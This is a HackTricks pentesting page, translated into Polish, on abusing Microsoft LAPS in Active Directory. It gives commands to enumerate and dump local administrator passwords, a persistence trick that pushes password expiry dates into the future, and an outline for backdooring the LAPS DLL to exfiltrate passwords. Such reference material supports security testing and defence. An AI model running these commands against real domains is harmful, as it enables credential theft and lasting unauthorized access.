# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Podstawowe informacje

Local Administrator Password Solution (LAPS) to narzędzie używane do zarządzania systemem, w którym **hasła administratorów**, które są **unikalne, losowe i często zmieniane**, są stosowane do komputerów dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i są dostępne tylko dla użytkowników, którzy otrzymali pozwolenie za pośrednictwem list kontroli dostępu (ACL). Bezpieczeństwo transmisji haseł z klienta do serwera zapewnia użycie **Kerberos wersja 5** oraz **Advanced Encryption Standard (AES)**.

W obiektach komputerów w domenie wdrożenie LAPS skutkuje dodaniem dwóch nowych atrybutów: **`ms-mcs-AdmPwd`** oraz **`ms-mcs-AdmPwdExpirationTime`**. Atrybuty te przechowują **hasło administratora w postaci jawnej** oraz **czas jego wygaśnięcia**, odpowiednio.

### Sprawdź, czy jest aktywowane
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla człowieka.

Ponadto, **natywne cmdlety PowerShell LAPS** mogą być używane, jeśli są zainstalowane na maszynie, do której mamy dostęp:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** może być również używany do ustalenia **kto może odczytać hasło i je odczytać**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia enumerację LAPS za pomocą kilku funkcji.\
Jedną z nich jest analizowanie **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS.** To pokaże **grupy** specjalnie **delegowane do odczytu haseł LAPS**, które często są użytkownikami w chronionych grupach.\
**Konto**, które **dołączyło komputer** do domeny, otrzymuje `All Extended Rights` nad tym hostem, a to prawo daje **konta** możliwość **odczytu haseł**. Enumeracja może pokazać konto użytkownika, które może odczytać hasło LAPS na hoście. To może pomóc nam **skierować się na konkretnych użytkowników AD**, którzy mogą odczytać hasła LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
Jeśli nie ma dostępu do powershell, możesz nadużyć tego uprawnienia zdalnie przez LDAP, używając
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
To będzie zrzut wszystkich haseł, które użytkownik może odczytać, co pozwoli ci uzyskać lepszą pozycję z innym użytkownikiem.

## **LAPS Utrzymywanie**

### **Data wygaśnięcia**

Będąc administratorem, możliwe jest **uzyskanie haseł** i **zapobieganie** maszynie w **aktualizacji** swojego **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłość**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Hasło nadal zostanie zresetowane, jeśli **administrator** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w LAPS GPO jest włączona opcja **Nie pozwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę**.
{% endhint %}

### Backdoor

Oryginalny kod źródłowy dla LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoora w kodzie (w metodzie `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`, na przykład), który w jakiś sposób **wyeksfiltruje nowe hasła lub przechowa je gdzie indziej**.

Następnie wystarczy skompilować nowy `AdmPwd.PS.dll` i przesłać go na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i zmienić czas modyfikacji).

## References
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}
